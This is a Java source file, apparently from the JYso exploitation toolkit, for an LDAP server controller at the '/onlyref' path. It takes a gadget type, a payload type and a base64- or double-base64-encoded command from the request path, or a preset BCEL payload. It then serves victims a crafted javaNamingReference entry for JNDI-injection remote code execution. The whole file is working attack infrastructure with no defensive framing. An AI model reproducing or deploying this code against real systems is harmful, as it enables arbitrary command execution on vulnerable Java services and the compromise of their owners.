package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.enumtypes.PayloadType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedActionTypeException;
import com.qi4l.JYso.exceptions.UnSupportedGadgetTypeException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.ObjectPayload;
import com.qi4l.JYso.gadgets.utils.Serializer;
import com.qi4l.JYso.gadgets.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.cli.CommandLine;

import javax.naming.RefAddr;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.Enumeration;

import static com.qi4l.JYso.gadgets.Config.Config.BCEL1;
import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/onlyref"})
public class onlyRefController implements LdapController{

    public static String      gadgetType;
    public static String      cmd11;
    public static GadgetType  gadgetType1;
    public static CommandLine cmdLine;
    private       PayloadType payloadType;
    private       String      params;
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("- Sending Reference object (onlyRef)");
        Entry e = new Entry(base);
        try {
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(gadgetType);
            ObjectPayload                        payload      = payloadClass.newInstance();
            Object                               object       = payload.getObject(params);

            Reference ref = (Reference) object;
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaClassName", ref.getClassName());
            e.addAttribute("javaFactory", ref.getFactoryClassName());

            Enumeration<RefAddr> enumeration = ref.getAll();
            int posn = 0;

            while (enumeration.hasMoreElements()) {
                StringRefAddr addr = (StringRefAddr) enumeration.nextElement();
                e.addAttribute("javaReferenceAddress", "#" + posn + "#" + addr.getType() + "#" + addr.getContent());
                posn ++;
            }
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException, UnSupportedActionTypeException {
        try {
            base = base.replace('\\', '/');
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try {
                gadgetType = base.substring(firstIndex + 1, secondIndex);
                System.out.println(ansi().render("@|green [+] GaddgetType : |@" + gadgetType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
            }
            int    thirdIndex = base.indexOf("/", secondIndex + 1);
            int    fourIndex  = base.indexOf("/", thirdIndex + 1);
            String Ty1        = base.substring(thirdIndex + 1, fourIndex);
            gadgetType1 = GadgetType.valueOf(Ty1.toLowerCase());
            // 若第三个斜杠不存在，则把其设置成为字符串的长度
            if (thirdIndex < 0) thirdIndex = base.length();
            try {
                // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                String Ty3 = base.substring(secondIndex + 1, thirdIndex);
                payloadType = PayloadType.valueOf(Ty3.toLowerCase());
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            if (payloadType == PayloadType.sethttp) {
                params = BCEL1;
                System.out.println(ansi().render("@|green [+] command：|@" + BCEL1));
            }

            if (payloadType == PayloadType.command) {

                if (gadgetType1 == GadgetType.base64) {
                    cmd11 = Util.getCmdFromBase(base);
                }

                if (gadgetType1 == GadgetType.base64Two) {
                    String encodedString = Util.getCmdFromBase(base);
                    byte[] decodedBytes  = Base64.getDecoder().decode(encodedString);
                    String T1            = new String(decodedBytes);
                    byte[] decodedBytes1 = Base64.getDecoder().decode(T1);
                    cmd11 = new String(decodedBytes1);
                }

                params = cmd11;
                System.out.println(ansi().render("@|green [+] command：|@" + cmd11));
            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
